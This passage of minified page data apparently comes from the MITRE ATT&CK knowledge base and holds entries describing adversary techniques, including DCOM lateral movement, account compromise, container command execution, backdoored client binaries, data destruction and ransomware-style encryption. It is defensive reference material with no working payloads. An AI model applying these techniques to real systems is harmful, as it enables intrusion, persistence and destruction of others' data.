(RDP)",external_references:[{source_name:b,external_id:mp,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1043"},{url:f,description:g,source_name:h}],tactics:[o]},{id:mq,"object-type":a,name:"Communication Through Removable Media",description:"Adversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system. Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement by \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1091'\u003EReplication Through Removable Media\u003C\u002Fa\u003E. Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access.",external_references:[{source_name:b,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1092",external_id:mq}],tactics:[o]},{id:mr,"object-type":a,name:"Component Object Model and Distributed COM",description:"**This technique has been deprecated. Please use \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1021\u002F003'\u003EDistributed Component Object Model\u003C\u002Fa\u003E and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1559\u002F001'\u003EComponent Object Model\u003C\u002Fa\u003E.**\n\nAdversaries may use the Windows Component Object Model (COM) and Distributed Component Object Model (DCOM) for local code execution or to execute on remote systems as part of lateral movement. \n\nCOM is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2019\u002F06\u002Fhunting-com-objects.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fms680573.aspx'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E DCOM is transparent middleware that extends the functionality of Component Object Model (COM) \u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fms680573.aspx'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E beyond a local computer using remote procedure call (RPC) technology.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2019\u002F06\u002Fhunting-com-objects.html'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nPermissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows\u002Fdesktop\u002Fcom\u002Fdcom-security-enhancements-in-windows-xp-service-pack-2-and-windows-server-2003-service-pack-1'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fms687317(v=vs.85).aspx'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fms694331(v=vs.85).aspx'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E By default, only Administrators may remotely activate and launch COM objects through DCOM.\n\nAdversaries may abuse COM for local command and\u002For payload execution. Various COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and VBScript.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fms680573.aspx'\u003E[8]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Specific COM objects also exists to directly perform functions beyond code execution, such as creating a \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1053'\u003EScheduled Task\u002FJob\u003C\u002Fa\u003E, fileless download\u002Fexecution, and other adversary behaviors such as Privilege Escalation and Persistence.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2019\u002F06\u002Fhunting-com-objects.html'\u003E[9]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgoogleprojectzero.blogspot.com\u002F2018\u002F04\u002Fwindows-exploitation-tricks-exploiting.html'\u003E[10]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may use DCOM for lateral movement. Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications \u003Csup\u003E\u003Ca href='https:\u002F\u002Fenigma0x3.net\u002F2017\u002F11\u002F16\u002Flateral-movement-using-outlooks-createobject-method-and-dotnettojscript\u002F'\u003E[11]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E as well as other Windows objects that contain insecure methods.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fenigma0x3.net\u002F2017\u002F01\u002F05\u002Flateral-movement-using-the-mmc20-application-com-object\u002F'\u003E[12]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fenigma0x3.net\u002F2017\u002F01\u002F23\u002Flateral-movement-via-dcom-round-2\u002F'\u003E[13]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E DCOM can also execute macros in existing documents \u003Csup\u003E\u003Ca href='https:\u002F\u002Fenigma0x3.net\u002F2017\u002F09\u002F11\u002Flateral-movement-using-excel-application-and-dcom\u002F'\u003E[14]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E and may also invoke \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1173'\u003EDynamic Data Exchange\u003C\u002Fa\u003E (DDE) execution directly through a COM created instance of a Microsoft Office application \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.cybereason.com\u002Fblog\u002Fleveraging-excel-dde-for-lateral-movement-via-dcom'\u003E[15]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E, bypassing the need for a malicious document.",external_references:[{source_name:b,external_id:mr,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1175"},{source_name:eh,url:ei,description:ej},{url:cm,description:cn,source_name:co},{url:ms,description:mt,source_name:mu},{url:mv,description:mw,source_name:mx},{url:"https:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fms694331(v=vs.85).aspx",description:"Microsoft. (n.d.). Registry Values for System-Wide Security. Retrieved November 21, 2017.",source_name:"Microsoft System Wide Com Keys"},{url:my,description:mz,source_name:mA},{url:ek,description:el,source_name:em},{url:en,description:eo,source_name:ep},{url:mB,description:mC,source_name:mD},{url:mE,description:mF,source_name:mG},{url:mH,description:mI,source_name:mJ}],tactics:[x,p]},{id:cp,"object-type":a,name:"Compromise Accounts",description:"Adversaries may compromise accounts with services that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating accounts (i.e. \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1585'\u003EEstablish Accounts\u003C\u002Fa\u003E), adversaries may compromise existing accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. \n\nA variety of methods exist for compromising accounts, such as gathering credentials via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E, purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps).\u003Csup\u003E\u003Ca href='https:\u002F\u002Farstechnica.com\u002Ftech-policy\u002F2011\u002F02\u002Fanonymous-speaks-the-inside-story-of-the-hbgary-hack\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Prior to compromising accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.\n\nPersonas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, etc.). Compromised accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.\n\nAdversaries may directly leverage compromised email accounts for \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566'\u003EPhishing\u003C\u002Fa\u003E.",external_references:[{source_name:b,external_id:cp,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1586"},{source_name:eq,description:er,url:es}],tactics:[e],subtechniques:[mK,mN]},{id:mQ,"object-type":a,name:"Compromise Client Software Binary",description:"Adversaries may modify client software binaries to establish persistent access to systems. Client software enables users to access services provided by a server. Common client software types are SSH clients, FTP clients, email clients, and web browsers.\n\nAdversaries may make modifications to client software binaries to carry out malicious tasks when those applications are in use. For example, an adversary may copy source code for the client software, add a backdoor, compile for the target, and replace the legitimate application binary (or support files) with the backdoored one. Since these applications may be routinely executed by the user, the adversary can leverage this for persistent access to the host.",external_references:[{source_name:b,external_id:mQ,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1554"}],tactics:[k]},{id:Z,"object-type":a,name:"Compromise Infrastructure",description:"Adversaries may compromise third-party infrastructure that can be used during targeting. Infrastructure solutions include physical or cloud servers, domains, and third-party web services. Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it during other phases of the adversary lifecycle.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fcontent\u002Fdam\u002Ffireeye-www\u002Fservices\u002Fpdfs\u002Fmandiant-apt1-report.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.icann.org\u002Fgroups\u002Fssac\u002Fdocuments\u002Fsac-007-en'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.talosintelligence.com\u002F2018\u002F11\u002Fdnspionage-campaign-targets-middle-east.html'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2015\u002F12\u002Fthe-eps-awakens-part-two.html'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Additionally, adversaries may compromise numerous machines to form a botnet they can leverage.\n\nUse of compromised infrastructure allows an adversary to stage, launch, and execute an operation. Compromised infrastructure can help adversary operations blend in with traffic that is seen as normal, such as contact with high reputation or trusted sites. By using compromised infrastructure, adversaries may make it difficult to tie their actions back to them. Prior to targeting, adversaries may compromise the infrastructure of other adversaries.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmedia.defense.gov\u002F2019\u002FOct\u002F18\u002F2002197242\u002F-1\u002F-1\u002F0\u002FNSA_CSA_Turla_20191021%20ver%204%20-%20nsa.gov.pdf'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:Z,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1584"},{url:ai,description:aj,source_name:ak},{source_name:mR,description:mS,url:mT},{source_name:mU,url:mV,description:mW},{source_name:"FireEye EPS Awakens Part 2",description:"Winters, R.. (2015, December 20). The EPS Awakens - Part 2. Retrieved January 22, 2016.",url:"https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2015\u002F12\u002Fthe-eps-awakens-part-two.html"},{source_name:mX,url:mY,description:mZ}],tactics:[e],subtechniques:[m_,na,nc,ne,ng,ni]},{id:nk,"object-type":a,name:"Container Administration Command",description:"Adversaries may abuse a container administration service to execute commands within a container. A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.docker.com\u002Fengine\u002Freference\u002Fcommandline\u002Fdockerd\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fkubernetes.io\u002Fdocs\u002Fconcepts\u002Foverview\u002Fkubernetes-api\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fkubernetes.io\u002Fdocs\u002Freference\u002Fcommand-line-tools-reference\u002Fkubelet\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nIn Docker, adversaries may specify an entrypoint during container deployment that executes a script or command, or they may use a command such as \u003Ccode\u003Edocker exec\u003C\u002Fcode\u003E to execute a command within a running container.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.docker.com\u002Fengine\u002Freference\u002Frun\u002F#entrypoint-default-command-to-execute-at-runtime'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.docker.com\u002Fengine\u002Freference\u002Fcommandline\u002Fexec\u002F'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E In Kubernetes, if an adversary has sufficient permissions, they may gain remote execution in a container in the cluster via interaction with the Kubernetes API server, the kubelet, or by running a command such as \u003Ccode\u003Ekubectl exec\u003C\u002Fcode\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fkubernetes.io\u002Fdocs\u002Ftasks\u002Fdebug-application-cluster\u002Fget-shell-running-container\u002F'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:nk,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1609"},{source_name:"Docker Daemon CLI",url:"https:\u002F\u002Fdocs.docker.com\u002Fengine\u002Freference\u002Fcommandline\u002Fdockerd\u002F",description:"Docker. (n.d.). DockerD CLI. Retrieved March 29, 2021."},{source_name:ez,url:eA,description:eB},{source_name:"Kubernetes Kubelet",url:"https:\u002F\u002Fkubernetes.io\u002Fdocs\u002Freference\u002Fcommand-line-tools-reference\u002Fkubelet\u002F",description:"The Kubernetes Authors. (n.d.). Kubelet. Retrieved March 29, 2021."},{source_name:"Docker Entrypoint",url:"https:\u002F\u002Fdocs.docker.com\u002Fengine\u002Freference\u002Frun\u002F#entrypoint-default-command-to-execute-at-runtime",description:"Docker. (n.d.). Docker run reference. Retrieved March 29, 2021."},{source_name:"Docker Exec",url:"https:\u002F\u002Fdocs.docker.com\u002Fengine\u002Freference\u002Fcommandline\u002Fexec\u002F",description:"Docker. (n.d.). Docker Exec. Retrieved March 29, 2021."},{source_name:"Kubectl Exec Get Shell",url:"https:\u002F\u002Fkubernetes.io\u002Fdocs\u002Ftasks\u002Fdebug-application-cluster\u002Fget-shell-running-container\u002F",description:"The Kubernetes Authors. (n.d.). Get a Shell to a Running Container. Retrieved March 29, 2021."}],tactics:[p]},{id:nl,"object-type":a,name:"Container and Resource Discovery",description:"Adversaries may attempt to discover containers and other resources that are available within a containers environment. Other resources may include images, deployments, pods, nodes, and other information such as the status of a cluster.\n\nThese resources can be viewed within web applications such as the Kubernetes dashboard or can be queried via the Docker and Kubernetes APIs.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.docker.com\u002Fengine\u002Fapi\u002Fv1.41\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fkubernetes.io\u002Fdocs\u002Fconcepts\u002Foverview\u002Fkubernetes-api\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E In Docker, logs may leak information about the environment, such as the environment’s configuration, which services are available, and what cloud provider the victim may be utilizing. The discovery of these resources may inform an adversary’s next steps in the environment, such as how to perform lateral movement and which methods to utilize for execution. ",external_references:[{source_name:b,external_id:nl,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1613"},{source_name:nm,url:nn,description:no},{source_name:ez,url:eA,description:eB}],tactics:[i]},{id:br,"object-type":a,name:"Create Account",description:"Adversaries may create an account to maintain access to victim systems. With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.\n\nAccounts may be created on the local system or within a domain or cloud tenant. In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection.",external_references:[{source_name:b,external_id:br,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1136"},{source_name:eC,description:eD,url:eE}],tactics:[k],subtechniques:[np,nr,nt]},{id:aO,"object-type":a,name:"Create or Modify System Process",description:"Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services. \u003Csup\u003E\u003Ca href='https:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Flibrary\u002Fcc772408.aspx'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E On macOS, launchd processes known as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1543\u002F004'\u003ELaunch Daemon\u003C\u002Fa\u003E and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1543\u002F001'\u003ELaunch Agent\u003C\u002Fa\u003E are run to finish system initialization and load user specific parameters.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdeveloper.apple.com\u002Flibrary\u002Fcontent\u002Fdocumentation\u002FMacOSX\u002FConceptual\u002FBPSystemStartup\u002FChapters\u002FCreatingLaunchdJobs.html'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \n\nAdversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  \n\nServices, daemons, or agents may be created with administrator privileges but executed under root\u002FSYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.synack.com\u002Fwp-content\u002Fuploads\u002F2016\u002F03\u002FRSA_OSX_Malware.pdf'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E.  ",external_references:[{source_name:b,external_id:aO,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1543"},{url:nv,description:nw,source_name:nx},{url:cq,description:cr,source_name:cs},{url:eF,description:eG,source_name:eH}],tactics:[k,u],subtechniques:[ny,nD,nI,nN]},{id:as,"object-type":a,name:"Credentials from Password Stores",description:"Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications that store passwords to make it easier for users manage and maintain. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.",external_references:[{source_name:b,external_id:as,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1555"}],tactics:[r],subtechniques:[nR,nT,nV,nX,nZ]},{id:n$,"object-type":a,name:"Data Destruction",description:"Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.symantec.com\u002Fconnect\u002Fblogs\u002Fshamoon-attacks'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2016\u002F11\u002Ffireeye_respondsto.html'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='http:\u002F\u002Fresearchcenter.paloaltonetworks.com\u002F2016\u002F11\u002Funit42-shamoon-2-return-disttrack-wiper\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmedia.kasperskycontenthub.com\u002Fwp-content\u002Fuploads\u002Fsites\u002F43\u002F2018\u002F03\u002F07180722\u002FReport_Shamoon_StoneDrill_final.pdf'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Funit42.paloaltonetworks.com\u002Fshamoon-3-targets-oil-gas-organization\u002F'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.talosintelligence.com\u002F2018\u002F02\u002Folympic-destroyer.html'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Common operating system file deletion commands such as \u003Ccode\u003Edel\u003C\u002Fcode\u003E and \u003Ccode\u003Erm\u003C\u002Fcode\u003E often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1561\u002F001'\u003EDisk Content Wipe\u003C\u002Fa\u003E and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1561\u002F002'\u003EDisk Structure Wipe\u003C\u002Fa\u003E because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.\n\nAdversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmedia.kasperskycontenthub.com\u002Fwp-content\u002Fuploads\u002Fsites\u002F43\u002F2018\u002F03\u002F07180722\u002FReport_Shamoon_StoneDrill_final.pdf'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Funit42.paloaltonetworks.com\u002Fshamoon-3-targets-oil-gas-organization\u002F'\u003E[8]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E In some cases politically oriented image files have been used to overwrite data.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2016\u002F11\u002Ffireeye_respondsto.html'\u003E[9]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='http:\u002F\u002Fresearchcenter.paloaltonetworks.com\u002F2016\u002F11\u002Funit42-shamoon-2-return-disttrack-wiper\u002F'\u003E[10]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmedia.kasperskycontenthub.com\u002Fwp-content\u002Fuploads\u002Fsites\u002F43\u002F2018\u002F03\u002F07180722\u002FReport_Shamoon_StoneDrill_final.pdf'\u003E[11]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1078'\u003EValid Accounts\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1003'\u003EOS Credential Dumping\u003C\u002Fa\u003E, and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1021\u002F002'\u003ESMB\u002FWindows Admin Shares\u003C\u002Fa\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.symantec.com\u002Fconnect\u002Fblogs\u002Fshamoon-attacks'\u003E[12]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2016\u002F11\u002Ffireeye_respondsto.html'\u003E[13]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='http:\u002F\u002Fresearchcenter.paloaltonetworks.com\u002F2016\u002F11\u002Funit42-shamoon-2-return-disttrack-wiper\u002F'\u003E[14]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmedia.kasperskycontenthub.com\u002Fwp-content\u002Fuploads\u002Fsites\u002F43\u002F2018\u002F03\u002F07180722\u002FReport_Shamoon_StoneDrill_final.pdf'\u003E[15]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.talosintelligence.com\u002F2018\u002F02\u002Folympic-destroyer.html'\u003E[16]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E.\n\nIn cloud environments, adversaries may leverage access to delete cloud storage, cloud storage accounts, machine images, and other infrastructure crucial to operations to damage an organization or their customers.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fthreatpost.com\u002Fhacker-puts-hosting-service-code-spaces-out-of-business\u002F106761\u002F'\u003E[17]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.justice.gov\u002Fusao-ndca\u002Fpr\u002Fsan-jose-man-pleads-guilty-damaging-cisco-s-network'\u003E[18]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:n$,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1485"},{description:oa,url:ob,source_name:oc},{url:od,description:oe,source_name:of},{url:eP,description:eQ,source_name:eR},{source_name:og,url:oh,description:oi},{description:oj,url:ok,source_name:ol},{source_name:bs,url:bt,description:bu},{source_name:"Data Destruction - Threat Post",url:"https:\u002F\u002Fthreatpost.com\u002Fhacker-puts-hosting-service-code-spaces-out-of-business\u002F106761\u002F",description:"Mimoso, M.. (2014, June 18). Hacker Puts Hosting Service Code Spaces Out of Business. Retrieved December 15, 2020."},{source_name:"DOJ  - Cisco Insider",url:"https:\u002F\u002Fwww.justice.gov\u002Fusao-ndca\u002Fpr\u002Fsan-jose-man-pleads-guilty-damaging-cisco-s-network",description:"DOJ. (2020, August 26). San Jose Man Pleads Guilty To Damaging Cisco’s Network. Retrieved December 15, 2020."}],tactics:[j]},{id:cw,"object-type":a,name:"Data Encoding",description:"Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system. Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FBinary-to-text_encoding'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FCharacter_encoding'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Some data encoding systems may also result in data compression, such as gzip.",external_references:[{source_name:b,external_id:cw,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1132"},{url:eS,description:eT,source_name:eU},{url:eV,description:eW,source_name:eX},{url:f,description:g,source_name:h}],tactics:[o],subtechniques:[om,oo]},{id:oq,"object-type":a,name:"Data Encrypted for Impact",description:"Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.us-cert.gov\u002Fncas\u002Falerts\u002FTA16-091A'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2017\u002F05\u002Fwannacry-malware-profile.html'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.us-cert.gov\u002Fncas\u002Falerts\u002FTA17-181A'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.us-cert.gov\u002Fncas\u002Falerts\u002FAA18-337A'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E In the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted. In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.us-cert.gov\u002Fncas\u002Falerts\u002FTA17-181A'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1078'\u003EValid Accounts\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1003'\u003EOS Credential Dumping\u003C\u002Fa\u003E, and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1021\u002F002'\u003ESMB\u002FWindows Admin Shares\u003C\u002Fa\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2017\u002F05\u002Fwannacry-malware-profile.html'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.us-cert.gov\u002Fncas\u002Falerts\u002FTA17-181A'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nIn cloud environments, storage objects within compromised accounts may also be encrypted.\u003Csup\u003E\u003Ca 